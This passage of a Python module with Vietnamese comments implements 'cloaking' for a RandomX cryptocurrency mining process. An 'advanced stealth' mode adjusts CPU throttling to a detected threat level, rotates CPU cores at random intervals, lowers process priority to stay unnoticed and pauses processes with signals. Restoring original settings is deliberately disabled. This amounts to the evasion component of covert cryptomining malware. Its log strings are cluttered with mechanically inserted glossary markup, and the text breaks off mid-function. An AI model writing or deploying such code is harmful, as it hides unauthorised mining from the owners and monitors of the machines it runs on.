"""
Mô-đun `cloak_strategies.py` - Các chiến lược [cloaking] (che giấu) cho tiến trình khai thác (đồng bộ).
CHÚ Ý: Phiên bản này đã loại bỏ hoàn toàn chức năng [restoration] (khôi phục) - chỉ còn [cloaking] (che giấu).
"""
# type: ignore

import logging
import traceback
import psutil
import threading
import time
import random
from abc import ABC, abstractmethod
from typing import Dict, List, Any, Optional, Type, cast, TYPE_CHECKING
from pathlib import Path

from .utils import MiningProcess

# ✅ UNIFIED LOGGING: Sử dụng hệ thống [logging] (ghi log) tập trung
from .unified_logging import get_unified_logger

# ✅ ERROR MANAGEMENT: Sử dụng hệ thống xử lý lỗi tập trung
from .error_management import get_error_reporter, ErrorCode, ErrorSeverity, report_error

# ✅ STANDARDIZED: Lấy thể hiện [unified logger] (logger hợp nhất) (khớp phân cấp)
cloak_logger = get_unified_logger('mining_environment.cloak_strategies')

# ✅ ERROR REPORTER: Lấy thể hiện [error reporter] (bộ báo lỗi) tập trung
error_reporter = get_error_reporter()

if TYPE_CHECKING:
    class CPUResourceManager: ...
    class GPUResourceManager: ...
    class NetworkResourceManager: ...
    class DiskIOResourceManager: ...
    class CacheResourceManager: ...
    class MemoryResourceManager: ...
else:
    CPUResourceManager = Any  # type: ignore
    GPUResourceManager = Any  # type: ignore
    NetworkResourceManager = Any  # type: ignore
    DiskIOResourceManager = Any  # type: ignore
    CacheResourceManager = Any  # type: ignore
    MemoryResourceManager = Any  # type: ignore


###############################################################################
#                    STRATEGY TYPES & UNIFIED ARCHITECTURE                   #
###############################################################################

class StrategyType:
    """
    ✅ ENHANCED: Các loại chiến lược [cloaking] (che giấu) cho [comprehensive resource control] (kiểm soát tài nguyên toàn diện).
    6 chiến lược đang hoạt động: CPU, GPU (kèm [thermal] – nhiệt), Network, Disk I/O, Cache, Memory
    """
    CPU = "cpu"
    NETWORK = "network"
    DISK_IO = "disk_io"
    CACHE = "cache"
    MEMORY = "memory"
    THERMAL_CONTROL = "thermal_control"  # ⚠️ DEPRECATED

###############################################################################
#                           CƠ SỞ CỦA CÁC STRATEGY                            #
###############################################################################

class CloakStrategy(ABC):
    """
    ✅ ENHANCED: Lớp cơ sở trừu tượng cho [comprehensive multi-strategy cloaking] (che giấu đa chiến lược toàn diện).
    Thiết kế lại cho [resource cloaking] (che giấu tài nguyên) toàn diện với [advanced coordination] (phối hợp nâng cao).
    """

    logger: logging.Logger  # thêm attribute để linter biết
    privileged_manager: Optional[Any] = None  # Để inject privileged operations
    strategy_type: str = ""  # Loại chiến lược (CPU, GPU, Network, ...)
    requires_plugin_system: bool = False  # Có yêu cầu plugin system không
    
    # ✅ NEW: Comprehensive cloaking attributes
    is_primary_strategy: bool = False  # Có phải primary strategy không
    coordination_priority: int = 50  # Priority for multi-strategy coordination (0-100)
    resource_conflicts: List[str] = []  # List of resource types that may conflict
    depends_on_strategies: List[str] = []  # Strategies this one depends on
    
    # ✅ NEW: Performance and compatibility attributes
    supports_concurrent_application: bool = True  # Có thể apply cùng lúc với strategies khác
    estimated_application_time_ms: int = 100  # Estimated time to apply strategy
    compatibility_matrix: Dict[str, str] = {}  # Compatibility với other strategies

    def set_privileged_manager(self, privileged_manager: Any) -> None:
        """
        [Inject] (bơm) `PrivilegedOperationManager` vào strategy.
        """
        self.privileged_manager = privileged_manager
        if hasattr(self, 'logger'):
            self.logger.debug(f"Injected privileged_manager into {self.__class__.__name__}")

    @abstractmethod
    def apply(self, process: MiningProcess) -> bool:
        """
        ✅ ENHANCED: Áp dụng chiến lược [cloaking] (che giấu) cho tiến trình với kiểm định giá trị trả về.
        
        :param process: Đối tượng `MiningProcess`.
        :return: bool - True nếu strategy áp dụng thành công, False nếu thất bại
        """
        pass

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục cài đặt ban đầu cho tiến trình (đồng bộ).
        CHÚ Ý: Tính năng [restore] (khôi phục) đã bị vô hiệu hoá trong phiên bản này.
        
        :param process: Đối tượng `MiningProcess`.
        :return: None
        """
        self.logger.info(f"[RESTORE DISABLED] Restore **[request]** (yêu cầu) for **[PID]** (Process ID - mã định danh tiến trình)={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
        pass

    # ✅ NEW: Comprehensive cloaking support methods
    def pre_apply_check(self, process: MiningProcess) -> bool:
        """
        ✅ NEW: Kiểm tra tương thích trước khi áp dụng cho [comprehensive cloaking] (che giấu toàn diện).
        
        :param process: Đối tượng `MiningProcess` để kiểm tra tương thích
        :return: True nếu strategy có thể áp dụng an toàn
        """
        try:
            # Base implementation - các subclasses có thể override
            return True
        except Exception as e:
            if hasattr(self, 'logger'):
                self.logger.debug(f"[Pre-apply check] (kiểm tra trước khi áp dụng) thất bại cho {self.__class__.__name__}: {e}")
            return False

    def post_apply_verification(self, process: MiningProcess) -> bool:
        """
        ✅ NEW: Xác minh sau khi áp dụng cho [comprehensive cloaking] (che giấu toàn diện).
        
        :param process: Đối tượng `MiningProcess` để xác minh
        :return: True nếu strategy đã được áp dụng thành công
        """
        try:
            # Base implementation - các subclasses có thể override
            return True
        except Exception as e:
            if hasattr(self, 'logger'):
                self.logger.debug(f"[Post-apply verification] (xác minh sau áp dụng) thất bại cho {self.__class__.__name__}: {e}")
            return False

    def check_resource_conflicts(self, other_strategies: List[str]) -> List[str]:
        """
        ✅ NEW: Kiểm tra xung đột tài nguyên tiềm tàng với các chiến lược khác.
        
        :param other_strategies: Danh sách tên chiến lược đang được áp dụng
        :return: Danh sách xung đột tiềm tàng
        """
        conflicts = []
        for strategy in other_strategies:
            if strategy in self.resource_conflicts:
                conflicts.append(strategy)
        return conflicts

    def get_strategy_metadata(self) -> Dict[str, Any]:
        """
        ✅ NEW: Lấy siêu dữ liệu ([metadata]) về chiến lược cho [comprehensive coordination] (phối hợp toàn diện).
        
        :return: Từ điển chứa siêu dữ liệu của chiến lược
        """
        return {
            'strategy_type': self.strategy_type,
            'is_primary': self.is_primary_strategy,
            'priority': self.coordination_priority,
            'conflicts': self.resource_conflicts,
            'dependencies': self.depends_on_strategies,
            'concurrent_safe': self.supports_concurrent_application,
            'estimated_time_ms': self.estimated_application_time_ms,
            'compatibility': self.compatibility_matrix
        }

###############################################################################
#                 CPU STRATEGY: CpuCloakStrategy                              #
###############################################################################

class CpuCloakStrategy(CloakStrategy):
    """
    ✅ ENHANCED: Chiến lược [cloaking] CPU cho [comprehensive multi-strategy environment] (môi trường đa chiến lược toàn diện):
      - Giới hạn CPU bằng cgroup,
      - Tối ưu cache CPU (tuỳ ý),
      - Đặt affinity,
      - Chuyển đổi giữa core chẵn/lẻ theo định kỳ (có thể random hoá khoảng thời gian).
    
    Tăng cường cho [comprehensive cloaking] (che giấu toàn diện) với [advanced coordination] (phối hợp nâng cao).
    """

    strategy_type = StrategyType.CPU
    requires_plugin_system = True  # CPU strategies require plugin system
    
    # ✅ NEW: Comprehensive cloaking attributes
    is_primary_strategy = True  # CPU cloaking is PRIMARY for CPU processes
    coordination_priority = 100  # Highest priority for CPU processes
    resource_conflicts = ['memory']  # May conflict with memory strategy on cgroup resources
    depends_on_strategies = []  # No dependencies
    supports_concurrent_application = True  # Safe to apply with other strategies
    estimated_application_time_ms = 500  # CPU cgroup setup takes ~500ms

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        cpu_resource_manager: CPUResourceManager
    ):
        """
        ✅ ENHANCED: Khởi tạo `CpuCloakStrategy` với khả năng nhận biết [metadata] (siêu dữ liệu).
        """
        self.logger = logger
        self.config = config
        self.cpu_resource_manager = cast(Any, cpu_resource_manager)
        
        # ✅ NEW: Type-specific configuration
        self.process_type_config = None

        # Enhanced: Check for advanced stealth capabilities
        self.advanced_stealth_enabled = False
        try:
            # Kiểm tra `CPU resource manager` có khả năng [stealth] (ẩn/che giấu) hay không
            if hasattr(cpu_resource_manager, 'stealth_manager') and hasattr(cpu_resource_manager, 'xeon_optimizer'):
                self.advanced_stealth_enabled = True
                self.logger.info("🛡️ [**[CPU]** (bộ xử lý trung tâm) Cloaking] Advanced stealth capabilities detected and enabled")
            else:
                self.logger.info("🔧 [**[CPU]** (bộ xử lý trung tâm) Cloaking] Standard cloaking mode (legacy)")
        except Exception as e:
            self.logger.debug(f"[**[CPU]** (bộ xử lý trung tâm) Cloaking] (che giấu **[CPU]** (bộ xử lý trung tâm)) kiểm tra khả năng stealth thất bại: {e}")

        # Lưu trữ cgroup name cho từng PID => {"base": "..."}, 
        # để tiện re-throttle, re-affinity v.v.
        self.process_cgroup: Dict[int, Dict[str, str]] = {}

        # Tên tiến trình CPU trong config
        self.allowed_process_name = config.get("processes", {}).get("CPU", "")
        if not self.allowed_process_name:
            self.logger.warning("Không tìm thấy cấu hình tiến trình **[CPU]** (bộ xử lý trung tâm) (**[key]** (khóa)='**[CPU]** (bộ xử lý trung tâm)') trong **[config]** (cấu hình).")

        self.dynamic_throttle: bool = bool(config.get('dynamic_throttle', True))  # đảm bảo tồn tại thuộc tính

        # Enhanced: Adaptive throttling based on threat level
        if self.advanced_stealth_enabled:
            self.base_throttle_percentage = config.get('throttle_percentage', 50)  # Lower base for stealth
            self.adaptive_throttling = True
            # Trong chế độ advanced, dynamic_throttle không cần thiết vì đã có adaptive_throttling
            self.dynamic_throttle = False
        else:
            self.throttle_percentage = config.get('throttle_percentage', 70)
            self.adaptive_throttling = False

        if not isinstance(self.base_throttle_percentage if self.advanced_stealth_enabled else self.throttle_percentage, (int, float)):
            self.logger.warning("Giá trị throttle_percentage không hợp lệ, dùng mặc định.")
            if self.advanced_stealth_enabled:
                self.base_throttle_percentage = 50
            else:
                self.throttle_percentage = 70

        # Enhanced: CPU affinity optimization for RandomX
        if self.advanced_stealth_enabled and hasattr(cpu_resource_manager, 'optimal_mining_config'):
            try:
                mining_config = cpu_resource_manager.optimal_mining_config  # type: ignore
                self.optimized_affinity_groups = mining_config.get('cpu_affinity_groups', [])
                self.optimal_thread_count = mining_config.get('threads', 6)
                self.instruction_set = mining_config.get('instruction_set', 'avx2')
                
                self.logger.info(f"🎯 [**[CPU]** (bộ xử lý trung tâm) Cloaking] RandomX optimization: {self.optimal_thread_count} threads, {self.instruction_set}")
                self.logger.info(f"🎯 [**[CPU]** (bộ xử lý trung tâm) Cloaking] Optimized affinity groups: {self.optimized_affinity_groups}")
            except Exception as e:
                self.logger.error(f"[**[CPU]** (bộ xử lý trung tâm) Cloaking] (che giấu **[CPU]** (bộ xử lý trung tâm)) tải [RandomX optimization] (tối ưu RandomX) thất bại: {e}")
                self.optimized_affinity_groups = []
        else:
            # Fallback to traditional even/odd core switching
            total_cores = psutil.cpu_count(logical=True) or 1
            self.even_cores = [i for i in range(total_cores) if i % 2 == 0]
            self.odd_cores = [i for i in range(total_cores) if i % 2 != 0]
            self.target_cores = self.even_cores  # Mặc định dùng core chẵn

        # Lock để tránh race condition
        self.core_lock = threading.Lock()

        # Enhanced: Signature randomization intervals
        if self.advanced_stealth_enabled:
            self.switch_interval_choices = config.get("stealth_switch_intervals", [
                (180, 300),    # 3 - 5 phút (faster for stealth)
                (300, 450),    # 5 - 7.5 phút
                (450, 600),    # 7.5 - 10 phút
            ])
        else:
            self.switch_interval_choices = config.get("switch_interval_choices", [
                (300, 600),    # 5 - 10 phút
                (600, 1200),   # 10 - 20 phút
                (1200, 1800),  # 20 - 30 phút
                (1800, 3600),  # 30 - 60 phút
                (3600, 7200),  # 60 - 120 phút
            ])

        # Enhanced: Dynamic threat-based throttling
        if self.advanced_stealth_enabled:
            self.adaptive_throttling = True
            threading.Thread(target=self._adaptive_stealth_monitoring, daemon=True).start()
        else:
            # Cấu hình throttle động
            self.dynamic_throttle = config.get('dynamic_throttle', True)
            self.update_interval_choices = config.get('update_interval_choices', [
                (300, 600),    # 5 - 10 phút
                (600, 1200),   # 10 - 20 phút
                (1200, 1800),  # 20 - 30 phút
                (1800, 3600),  # 30 - 60 phút
                (3600, 7200),  # 60 - 120 phút
            ])

        # Khởi tạo luồng cập nhật throttle (nếu dynamic_throttle = True)
        if self.dynamic_throttle:
            threading.Thread(target=self._update_throttle_percentage, daemon=True).start()

        # Khởi tạo luồng chuyển cores
        if self.advanced_stealth_enabled:
            threading.Thread(target=self._adaptive_core_switching, daemon=True).start()
        else:
            threading.Thread(target=self._switch_cores, daemon=True).start()

        # Enhanced: Add system optimization loop
        threading.Thread(target=self._system_health_monitor, daemon=True).start()

        self.logger.info(f"[**[CPU]** (bộ xử lý trung tâm) Cloaking] (che giấu **[CPU]** (bộ xử lý trung tâm)) đã khởi tạo - Advanced: {self.advanced_stealth_enabled}")

    def _adaptive_stealth_monitoring(self) -> None:
        """
        Giám sát nâng cao với phản ứng thích ứng theo [threat] (mức đe doạ)
        """
        while True:
            try:
                if not self.advanced_stealth_enabled or not hasattr(self.cpu_resource_manager, 'current_threat_level'):
                    time.sleep(30)
                    continue

                # Get current threat level from resource manager
                threat_level = getattr(self.cpu_resource_manager, 'current_threat_level', 'LOW')
                
                # ------------------------------
                # Giảm mạnh throttle cho cấp LOW
                #  → Cho phép tiến trình CPU sử dụng > 80 % (throttle chỉ 10 %)
                # ------------------------------
                if threat_level == "LOW":
                    new_throttle = 10  # throttle 10 % ⇒ ~90 % CPU
                else:
                    threat_throttle_mapping = {
                        "MEDIUM": self.base_throttle_percentage + random.uniform(10, 20),  # 50-70 %
                        "HIGH": self.base_throttle_percentage + random.uniform(25, 40)     # 70-90 %
                    }
                    new_throttle = max(25, min(90, threat_throttle_mapping.get(threat_level, 50)))
                
                self.logger.info(f"🛡️ [**[CPU]** (bộ xử lý trung tâm) Cloaking] Threat level: {threat_level} → Throttle: {new_throttle:.1f}%")
                
                # Apply new throttling to all managed processes
                with self.core_lock:
                    for pid, info in self.process_cgroup.items():
                        try:
                            if self.cpu_resource_manager and hasattr(self.cpu_resource_manager, '_adapt_throttling_to_threat_level'):
                                self.cpu_resource_manager._adapt_throttling_to_threat_level(pid, threat_level)
                            else:
                                # Fallback to direct throttling
                                self.cpu_resource_manager.throttle_cpu_usage(
                                    pid=pid,
                                    throttle_percentage=new_throttle,
                                    base_cgroup_name=info.get("base"),
                                    cores=self._get_current_target_cores()
                                )
                        except Exception as e:
                            self.logger.error(f"🛡️ [**[CPU]** (bộ xử lý trung tâm) Cloaking] (che giấu **[CPU]** (bộ xử lý trung tâm)) thích ứng thất bại cho **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")

                # Adaptive sleep based on threat level
                sleep_duration = {
                    "LOW": random.randint(45, 75),      # 45-75 seconds
                    "MEDIUM": random.randint(30, 45),   # 30-45 seconds  
                    "HIGH": random.randint(15, 30)      # 15-30 seconds
                }.get(threat_level, 60)
                
                time.sleep(sleep_duration)

            except Exception as e:
                self.logger.error(f"🛡️ [**[CPU]** (bộ xử lý trung tâm) Cloaking] Adaptive monitoring **[error]** (lỗi): {e}")
                time.sleep(60)

    def _adaptive_core_switching(self):
        """
        Chuyển đổi lõi nâng cao với [RandomX optimization] (tối ưu RandomX)
        """
        while True:
            try:
                # Sleep duration based on stealth intervals
                if self.switch_interval_choices:
                    chosen_range = random.choice(self.switch_interval_choices)
                    sleep_sec = random.randint(chosen_range[0], chosen_range[1])
                    self.logger.info(f"🛡️ [**[CPU]** (bộ xử lý trung tâm) Cloaking] Next core switch in {sleep_sec} seconds (stealth mode)")
                    time.sleep(sleep_sec)
                else:
                    time.sleep(300)  # Fallback

                with self.core_lock:
                    if self.optimized_affinity_groups:
                        # Use RandomX-optimized affinity groups
                        current_group_idx = getattr(self, '_current_group_idx', 0)
                        next_group_idx = (current_group_idx + 1) % len(self.optimized_affinity_groups)
                        
                        self.target_cores = self.optimized_affinity_groups[next_group_idx]
                        self._current_group_idx = next_group_idx
                        
                        self.logger.info(f"🎯 [**[CPU]** (bộ xử lý trung tâm) Cloaking] Switched to optimized group {next_group_idx}: {self.target_cores}")
                    else:
                        # Fallback to even/odd switching
                        if hasattr(self, 'target_cores') and hasattr(self, 'even_cores'):
                            if self.target_cores == self.even_cores:
                                self.target_cores = self.odd_cores
                                self.logger.info("🛡️ [**[CPU]** (bộ xử lý trung tâm) Cloaking] Switched to odd cores")
                            else:
                                self.target_cores = self.even_cores
                                self.logger.info("🛡️ [**[CPU]** (bộ xử lý trung tâm) Cloaking] Switched to even cores")

                    # Update affinity for all managed processes
                    for pid, info in list(self.process_cgroup.items()):
                        try:
                            process = psutil.Process(pid)
                            if process.is_running():
                                # CPU cores managed by cgroup cpuset, not process affinity
                                self.logger.debug(f"🛡️ [**[CPU]** (bộ xử lý trung tâm) Cloaking] Target cores for **[PID]** (Process ID - mã định danh tiến trình)={pid}: {self.target_cores} (via cgroup cpuset)")
                        except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
                            self.logger.warning(f"🛡️ [**[CPU]** (bộ xử lý trung tâm) Cloaking] Cannot update affinity **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
                            # Remove dead process
                            if pid in self.process_cgroup:
                                del self.process_cgroup[pid]
                        except Exception as e:
                            self.logger.error(f"🛡️ [**[CPU]** (bộ xử lý trung tâm) Cloaking] (che giấu **[CPU]** (bộ xử lý trung tâm)) lỗi cập nhật [**[CPU]** (bộ xử lý trung tâm) affinity] (gắn lõi **[CPU]** (bộ xử lý trung tâm)) **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")

            except Exception as e:
                self.logger.error(f"🛡️ [**[CPU]** (bộ xử lý trung tâm) Cloaking] Core switching **[error]** (lỗi): {e}")
                time.sleep(300)

    def _get_current_target_cores(self) -> List[int]:
        """Hàm trợ giúp để lấy [target cores] (các lõi mục tiêu) hiện tại"""
        with self.core_lock:
            return self.target_cores.copy() if hasattr(self, 'target_cores') else []

    def _update_throttle_percentage(self) -> None:
        """
        Luồng nền cập nhật `throttle_percentage` động (60–90%),
        rồi gọi `throttle_cpu_usage(...)` cho mỗi PID đang [cloaking] (che giấu).
        """
        while True:
            try:
                # 1) Random throttle 60–90%
                new_throttle = random.uniform(60, 90)
                self.logger.info(f"[**[CPU]** (bộ xử lý trung tâm) Cloaking] Đã cập nhật throttle_percentage: {new_throttle:.2f}%.")
                self.throttle_percentage = new_throttle

                # 2) Re-throttle toàn bộ PID đang cloaking
                # Bọc bằng lock để tránh race với apply/restore/switch_cores
                with self.core_lock:
                    for pid, info in self.process_cgroup.items():
                        base_name = info.get("base")
                        if not base_name:
                            continue
                        try:
                            self.logger.info(
                                f"[CPU Cloaking] Re-throttle PID={pid} => {new_throttle:.2f}% (cgroup={base_name})."
                            )
                            self.cpu_resource_manager.throttle_cpu_usage(
                                pid=pid,
                                throttle_percentage=new_throttle,
                                base_cgroup_name=base_name,
                                cores=self.target_cores
                            )
                        except Exception as e:
                            self.logger.error(f"[**[CPU]** (bộ xử lý trung tâm) Cloaking] Lỗi re-throttle **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")

            except Exception as e:
                self.logger.error(f"[**[CPU]** (bộ xử lý trung tâm) Cloaking] Lỗi khi cập nhật throttle_percentage động: {e}")

            # 3) Ngủ ngẫu nhiên theo update_interval_choices
            if self.update_interval_choices:
                chosen_range = random.choice(self.update_interval_choices)
                min_sec, max_sec = chosen_range
                random_sleep_sec = random.randint(min_sec, max_sec)
                self.logger.info(f"[**[CPU]** (bộ xử lý trung tâm) Cloaking] Sẽ ngủ {random_sleep_sec} giây trước lần cập nhật throttle tiếp theo.")
                time.sleep(random_sleep_sec)
            else:
                self.logger.error("[**[CPU]** (bộ xử lý trung tâm) Cloaking] Không có update_interval_choices trong cấu hình!")
                break

    def _switch_cores(self):
        """
        Luồng nền định kỳ: chuyển chẵn <-> lẻ, sau đó `configure_cpuset` + đặt `affinity`.
        """
        while True:
            try:
                # 1) Random thời gian
                if self.switch_interval_choices:
                    chosen_range = random.choice(self.switch_interval_choices)
                    sleep_sec = random.randint(chosen_range[0], chosen_range[1])
                    self.logger.info(f"[**[CPU]** (bộ xử lý trung tâm) Cloaking] Sẽ ngủ {sleep_sec} giây trước khi chuyển core (random).")
                    time.sleep(sleep_sec)
                else:
                    self.logger.error("[**[CPU]** (bộ xử lý trung tâm) Cloaking] Không có switch_interval_choices trong cấu hình!")
                    break

                # 2) Bắt đầu chuyển core
                with self.core_lock:
                    if self.target_cores == self.even_cores:
                        self.target_cores = self.odd_cores
                        self.logger.info("[**[CPU]** (bộ xử lý trung tâm) Cloaking] Chuyển sang cores lẻ.")
                    else:
                        self.target_cores = self.even_cores
                        self.logger.info("[**[CPU]** (bộ xử lý trung tâm) Cloaking] Chuyển sang cores chẵn.")

                    # 3) Cập nhật cho tất cả PID đang cloaking
                    for pid, info in list(self.process_cgroup.items()):
                        base_name = info.get("base")
                        if not base_name:
                            continue

                        # Cập nhật cpuset
                        ok_cpuset = self.cpu_resource_manager.configure_cpuset(base_name, self.target_cores)
                        if ok_cpuset:
                            self.logger.info(f"[**[CPU]** (bộ xử lý trung tâm) Cloaking] Đã cập nhật cpuset => {self.target_cores} cho **[PID]** (Process ID - mã định danh tiến trình)={pid}.")
                        else:
                            self.logger.error(f"[**[CPU]** (bộ xử lý trung tâm) Cloaking] Lỗi configure_cpuset **[PID]** (Process ID - mã định danh tiến trình)={pid} cgroup={base_name}.")

                        # Đặt CPU affinity
                        ok_affinity = self.cpu_resource_manager.optimize_thread_scheduling(
                            pid,
                            self.target_cores,
                            base_name
                        )
                        if ok_affinity:
                            self.logger.info(f"[**[CPU]** (bộ xử lý trung tâm) Cloaking] Đã đặt **[CPU]** (bộ xử lý trung tâm) affinity => {self.target_cores} cho **[PID]** (Process ID - mã định danh tiến trình)={pid}.")
                        else:
                            self.logger.error(f"[**[CPU]** (bộ xử lý trung tâm) Cloaking] Không thể đặt affinity cho **[PID]** (Process ID - mã định danh tiến trình)={pid}.")
            except Exception as e:
                self.logger.error(f"[**[CPU]** (bộ xử lý trung tâm) Cloaking] Lỗi trong luồng _switch_cores: {e}")

    def _verify_cgroup_settings(self, base_cgroup_name: str, pid: int) -> bool:
        """
        Xác minh nâng cao với dọn dẹp tiến trình và [emergency throttling] (giới hạn khẩn cấp)
        """
        try:
            process = psutil.Process(pid)
            
            # 1. Process Health Check & Cleanup
            try:
                status = process.status()
                if status in ['zombie', 'stopped']:
                    self.logger.warning(f"🧟 [**[process]** (tiến trình) Cleanup] (dọn dẹp tiến trình) **[PID]** (Process ID - mã định danh tiến trình)={pid} trạng thái: {status} - Đang thử dọn dẹp")
                    
                    # Cleanup zombie/stopped process
                    try:
                        if status == 'stopped':
                            process.resume()  # Try to resume first
                            time.sleep(0.1)
                            
                        if process.status() in ['zombie', 'stopped']:
                            process.terminate()
                            time.sleep(0.2)
                            
                            if process.is_running():
                                process.kill()  # Force kill if needed
                                time.sleep(0.1)
                                
                    except (psutil.AccessDenied, psutil.NoSuchProcess):
                        pass
                    
                    # Remove from tracking
                    if pid in self.process_cgroup:
                        del self.process_cgroup[pid]
                        self.logger.info(f"🧹 [**[process]** (tiến trình) Cleanup] Removed dead **[PID]** (Process ID - mã định danh tiến trình)={pid} from tracking")
                    
                    return False
                else:
                    self.logger.debug(f"✅ [**[process]** (tiến trình) Health] **[PID]** (Process ID - mã định danh tiến trình)={pid} status OK: {status}")
                    
            except Exception as e:
                self.logger.warning(f"[**[process]** (tiến trình) Health] Không thể kiểm tra status **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
            
            # 2. Enhanced CPU Usage Monitoring với Emergency Response
            try:
                cpu_percent = process.cpu_percent(interval=0.1)
                
                # Emergency throttling for extreme CPU usage
                if cpu_percent > 800:  # >8 cores full utilization
                    self.logger.error(f"🚨 [Emergency] **[PID]** (Process ID - mã định danh tiến trình)={pid} extreme **[CPU]** (bộ xử lý trung tâm) usage: {cpu_percent:.1f}% - Emergency throttling")
                    
                    # Apply emergency measures
                    try:
                        # Set lowest priority
                        process.nice(19)
                        
                        # Emergency: limit to single core via cgroup cpuset
                        emergency_cores = [0]
                        # CPU cores managed by cgroup cpuset system
                        
                        # Try to reduce threads if possible
                        if hasattr(process, 'num_threads'):
                            thread_count = process.num_threads()
                            if thread_count > 4:
                                self.logger.warning(f"🚨 [Emergency] **[PID]** (Process ID - mã định danh tiến trình)={pid} has {thread_count} threads - High **[resource]** (tài nguyên) usage")
                        
                        self.logger.info(f"🚨 [Emergency] Applied emergency throttling to **[PID]** (Process ID - mã định danh tiến trình)={pid}")
                        
                    except Exception as emergency_e:
                        self.logger.error(f"🚨 [Emergency] (khẩn cấp) giới hạn khẩn cấp (emergency throttling) thất bại cho **[PID]** (Process ID - mã định danh tiến trình)={pid}: {emergency_e}")
                        
                elif cpu_percent > 400:  # >4 cores
                    self.logger.warning(f"⚠️ [High **[CPU]** (bộ xử lý trung tâm)] (**[CPU]** (bộ xử lý trung tâm) cao) **[PID]** (Process ID - mã định danh tiến trình)={pid} dùng {cpu_percent:.1f}% **[CPU]** (bộ xử lý trung tâm) - Theo dõi sát")
                    
                    # Apply intermediate throttling for high CPU usage
                    try:
                        current_nice = process.nice()
                        if current_nice < 15:
                            process.nice(15)
                            self.logger.info(f"⚠️ [High **[CPU]** (bộ xử lý trung tâm)] Increased nice **[value]** (giá trị) to 15 for **[PID]** (Process ID - mã định danh tiến trình)={pid}")
                            
                        # Monitor current CPU allocation for high CPU processes
                        current_affinity = process.cpu_affinity()
                        if current_affinity and len(current_affinity) > 2:
                            limited_cores = [0, 1]  # Target: limit to first 2 cores via cgroup
                            self.logger.info(f"⚠️ [High **[CPU]** (bộ xử lý trung tâm)] Should limit **[PID]** (Process ID - mã định danh tiến trình)={pid} to 2 cores: {limited_cores} (via cgroup cpuset)")
                            
                        # Try SIGSTOP/SIGCONT cycling for extreme cases
                        if cpu_percent > 600:  # >6 cores
                            self.logger.warning(f"🛑 [Extreme **[CPU]** (bộ xử lý trung tâm)] **[PID]** (Process ID - mã định danh tiến trình)={pid} using {cpu_percent:.1f}% - Applying pause cycling")
                            try:
                                import signal
                                import os
                                os.kill(pid, signal.SIGSTOP)  # Pause process
                                time.sleep(0.1)  # Brief pause
                                os.kill(pid, signal.SIGCONT)  # Resume process
                                self.logger.info(f"🛑 [Extreme **[CPU]** (bộ xử lý trung tâm)] Applied pause cycling to **[PID]** (Process ID - mã định danh tiến trình)={pid}")
                            except Exception as pause_e:
                                self.logger.debug(f"🛑 [Extreme **[CPU]** (bộ xử lý trung tâm)] (**[CPU]** (bộ xử lý trung tâm) cực cao) tạm dừng luân phiên thất bại cho **[PID]** (Process ID - mã định danh tiến trình)={pid}: {pause_e}")
                                
                    except Exception as throttle_e:
                        self.logger.error(f"⚠️ [High **[CPU]** (bộ xử lý trung tâm)] (**[CPU]** (bộ xử lý trung tâm) cao) giới hạn trung gian thất bại cho **[PID]** (Process ID - mã định danh tiến trình)={pid}: {throttle_e}")
                    
                elif cpu_percent > 200:  # >2 cores  
                    self.logger.info(f"📊 [**[CPU]** (bộ xử lý trung tâm) Monitor] (giám sát **[CPU]** (bộ xử lý trung tâm)) **[PID]** (Process ID - mã định danh tiến trình)={pid} dùng {cpu_percent:.1f}% **[CPU]** (bộ xử lý trung tâm) - Hoạt động khai thác bình thường")
                else:
                    self.logger.debug(f"📈 [**[CPU]** (bộ xử lý trung tâm) Monitor] (giám sát **[CPU]** (bộ xử lý trung tâm)) **[PID]** (Process ID - mã định danh tiến trình)={pid} dùng {cpu_percent:.1f}% **[CPU]** (bộ xử lý trung tâm)")
                    
            except Exception as e:
                self.logger.debug(f"[**[CPU]** (bộ xử lý trung tâm) Monitor] Không thể kiểm tra **[CPU]** (bộ xử lý trung tâm) usage **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
            
            # 3. Enhanced Memory Monitoring với Leak Detection
            try:
                memory_info = process.memory_info()
                memory_percent = process.memory_percent()
                
                # Memory leak detection
                if memory_percent > 25:  # >25% RAM usage
                    self.logger.warning(f"🧠 [**[memory]** (bộ nhớ) Alert] **[PID]** (Process ID - mã định danh tiến trình)={pid} high **[memory]** (bộ nhớ) usage: {memory_percent:.1f}% ({memory_info.rss // 1024 // 1024} MB)")
                    
                    # Log memory growth trend if possible
                    current_memory_key = f"memory_tracking_{pid}"
                    if hasattr(self, current_memory_key):
                        previous_memory = getattr(self, current_memory_key)
                        growth = memory_info.rss - previous_memory
                        if growth > 100 * 1024 * 1024:  # >100MB growth
                            self.logger.warning(f"🧠 [**[memory]** (bộ nhớ) Growth] **[PID]** (Process ID - mã định danh tiến trình)={pid} **[memory]** (bộ nhớ) grew by {growth // 1024 // 1024}MB")
                    
                    setattr(self, current_memory_key, memory_info.rss)
                else:
                    self.logger.debug(f"🧠 [**[memory]** (bộ nhớ) OK] **[PID]** (Process ID - mã định danh tiến trình)={pid} using {memory_percent:.1f}% RAM ({memory_info.rss // 1024 // 1024} MB)")
                    
            except Exception as e:
                self.logger.debug(f"[**[memory]** (bộ nhớ) Monitor] (giám sát bộ nhớ) lỗi kiểm tra bộ nhớ **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
            
            # 4. Process Priority Verification
            try:
                nice_value = process.nice()
                if nice_value <= 0:
                    self.logger.warning(f"⚡ [Priority Alert] **[PID]** (Process ID - mã định danh tiến trình)={pid} has high priority: {nice_value}")
                    # Try to lower priority for stealth
                    try:
                        process.nice(10)  # Set to lower priority
                        self.logger.info(f"⚡ [Priority Fix] Lowered priority for **[PID]** (Process ID - mã định danh tiến trình)={pid}")
                    except:
                        pass
                else:
                    self.logger.debug(f"⚡ [Priority OK] **[PID]** (Process ID - mã định danh tiến trình)={pid} nice **[value]** (giá trị): {nice_value}")
                    
            except Exception as e:
                self.logger.debug(f"[Priority Check] (kiểm tra ưu tiên) lỗi cho **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
            
            # 5. CPU Affinity Verification với Advanced Stealth
